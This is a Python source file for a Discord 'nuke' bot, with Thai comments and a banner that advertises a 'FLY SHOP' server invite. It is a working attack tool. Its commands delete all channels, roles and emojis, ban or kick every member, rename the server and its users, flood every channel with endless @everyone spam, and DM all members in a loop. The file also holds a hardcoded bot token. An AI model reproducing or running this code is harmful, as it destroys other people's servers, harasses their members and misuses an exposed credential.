import discord
import os
import requests
import json
import threading
from threading import Thread
from user_agent import generate_user_agent
from pystyle import Colors, Colorate, Write
from discord.ext import commands

token = "OTg5ODcyODI5MjM3NDYxMDUy.GibR4F.kWnAWscPREv-u-D-U2h85_QVCqT_3PjWpX4Bao"
prefix = "!"



bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())


print(Colorate.Horizontal(Colors.blue_to_red, f'''
╔═╗╦ ╦ ╦  ╔═╗╦ ╦╔═╗╔═╗
╠╣ ║ ╚╦╝  ╚═╗╠═╣║ ║╠═╝
╚  ╩═╝╩   ╚═╝╩ ╩╚═╝╩  


Discord : https://discord.com/invite/YknWyFmCGc

_______________________________________________________

1.{prefix}d ลบห้องทั้งหมด
2.{prefix}c [name] [num] สร้างห้อง
3.{prefix}r ลบยศทั้งหมด
4.{prefix}re [name] เปลี่ยนชื่อเซิร์ฟเวอร์
5.{prefix}rc [name] เปลี่ยนชื่อห้องทั้งหมด
6.{prefix}ban เเบนคนทั้งหมด
7.{prefix}kickall เตะคนทั้งหมด
9.{prefix}event สเเปมทุกช่อง
10.{prefix}rs [name] เปลี่ยนชื่อสมาชิกทุกคน
11.{prefix}de ลบอิโมจิทิ้งหมด
12.{prefix}dmall ส่งข้อความถึงสมาชิกทั้งหมด
13.{prefix}cr สร้างบทบาท

_______________________________________________________
    ''', 1))


@bot.event
async def on_ready():
	print('พร้อม nuke')
	
@bot.command()
async def get(ctx):
	user = ctx.message.author
	role = discord.utils.get(ctx.guild.roles, id=1043173388304269322)
	await user.add_roles(role)
	
#ลบห้องทั้งหมด
@bot.command()
async def d(ctx):
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		try:
			def clear_channels():
				requests.delete(f"https://discord.com/api/v9/channels/{channel.id}",headers={"authorization": f"Bot {token}"})
			threading.Thread(target=clear_channels).start()
		except Exception as f:
			print(f)
			
#สร้างห้อง
@bot.command()
async def c(ctx, name, jam):
	await ctx.message.delete()
	n2 = name
	guild = ctx.guild
	def api():
		requests.post(f"https://discord.com/api/v9/guilds/{guild.id}/channels",headers={"authorization": f"Bot {token}"},json={"name":n2,"type":0})
	for i in range(int(jam)):
		threading.Thread(target=api).start()
		
#ลบยศทั้งหมด
@bot.command()
async def r(ctx):
	await ctx.message.delete()
	for role in ctx.guild.roles:
		try:
			await role.delete()
		except Exception as f:
			print(f)
			
#เปลี่ยนชื่อเซิร์ฟเวอร์
@bot.command()
async def re(ctx, name):
	await ctx.message.delete()
	await ctx.guild.edit(name=name)
	
#เปลี่ยนชื่อห้องทั้งหมด
@bot.command()
async def rc(ctx, name):
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		try:
			await channel.edit(name=name)
		except Exception as f:
			print(f)
			
#แบน all
@bot.command()
async def ban(ctx):
	await ctx.message.delete()
	for user in ctx.guild.members:
		try:
			await user.ban()
		except Exception as f:
			print(f)
			
#เตะ all
@bot.command()
async def kickall(ctx):
	await ctx.message.delete()
	for user in ctx.guild.members:
		try:
			await user.kick()
		except Exception as f:
			print(f)
			
#สแปมทุกช่อง
@bot.command()
async def event(ctx):
	await ctx.message.delete()
	while True:
		for channel in ctx.guild.text_channels:
			def api():
				requests.post(f"https://discord.com/api/v9/channels/{channel.id}/messages",headers={"authorization": f"Bot {token}"},json={"content": "@everyone @everyone ⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓️⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓⛓ \nFLY SHOP มาเยือนแล้ววว !! https://discord.com/invite/YknWyFmCGc\n"})
			threading.Thread(target=api).start()
			
#เปลี่ยนชื่อสมาชิกทุกคน
@bot.command()
async def rs(ctx, n):
	await ctx.message.delete()
	for member in ctx.guild.members:
		await member.edit(name=n)
		
#ลบอิโมจิทั้งหมด
@bot.command()
async def de(ctx):
	await ctx.message.delete()
	for m in ctx.guild.emojis:
		await m.delete()
		
#ส่งข้อความถึงสมาชิกทั้งหมด
@bot.command()
async def dmall(ctx):
	await ctx.message.delete()
	while True:
		for m in ctx.guild.members:
			await m.send('FLY SHOP มาเยือนแล้ววว !!! https://discord.com/invite/YknWyFmCGc')
			
#สร้างบทบาท
@bot.command()
async def cr(ctx, n):
	for i in range(50):
		await ctx.guild.create_roles(name="FLY SHOP")

			
				
			
	
	
					
bot.run(token)